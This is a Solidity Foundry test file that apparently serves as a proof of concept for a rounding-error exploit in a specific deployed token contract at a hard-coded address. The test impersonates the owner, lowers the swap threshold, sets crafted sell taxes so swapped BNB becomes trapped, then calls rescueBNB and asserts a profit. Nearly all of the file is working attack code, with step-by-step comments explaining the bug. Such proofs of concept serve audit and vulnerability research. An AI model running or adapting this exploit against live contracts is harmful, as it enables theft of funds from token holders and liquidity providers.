// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface Honey {
    function owner() external view returns (address);
    function router() external view returns (IRouter);
    function pair() external view returns (address);
    function setTradingStatus() external;
    function approve(address spender, uint256 amount) external returns(bool);
    function updateSwapTokensAtAmount(uint256 amount) external;
    function swapTokensAtAmount() external view returns (uint256);
    function setSellTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _Stake, uint256 _Dapp) external;
    function includeInFee(address account) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function rescueBNB(uint256 weiAmount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6927BA6c0068Ca8584EeA45f2b5dF02ddecD1bEA;
    address attacker = address(this);
    Honey public target;
    address public owner;
    address public pair;
    IRouter public router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = Honey(payable(TARGET));
        owner = target.owner();
        router = target.router();
        pair = target.pair();

        // Give attacker some ETH for liquidity and gas
        deal(attacker, 100 ether);

        vm.startPrank(owner);

        // Enable trading
        target.setTradingStatus();

        // Provide initial liquidity
        uint256 tokenAmount = 100_000_000 * 10**5;
        target.approve(address(router), tokenAmount);
        router.addLiquidityETH{value: 10 ether}(
            address(target),
            tokenAmount,
            0,
            0,
            attacker,
            block.timestamp
        );
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        vm.startPrank(owner);

                // 1. Set swap threshold to a very low amount (1 token)
                target.updateSwapTokensAtAmount(1);
                uint256 swapAmount = target.swapTokensAtAmount();

                // 2. Set malicious sell taxes to create a large divisor for the rounding error
                // Denominator for unitBalance = ((marketing_fee * 2) - liquidity_fee)
                // = ((15 * 2) - 0) = 30
                target.setSellTaxes(0, 15, 0, 0, 0);

                // 3. The owner is fee-exempt by default. Include them in fees to trigger the swap mechanism.
                target.includeInFee(attacker);

                // 4. Seed the contract with just enough tokens to trigger the swap on the next transfer
                target.transfer(address(target), swapAmount);

                // 5. Trigger the vulnerable swap by selling a small amount.
                // The amount of BNB received (deltaBalance) will be < 30 wei, causing unitBalance to be 0.
                target.transfer(pair, 1 * 10**5);

                // 6. The swapped BNB is now trapped in the contract.
                uint256 trappedBNB = address(target).balance;
                assertTrue(trappedBNB > 0, "Exploit failed: No BNB was trapped in the contract.");

                // 7. Rescue the trapped BNB
                target.rescueBNB(trappedBNB);

                vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

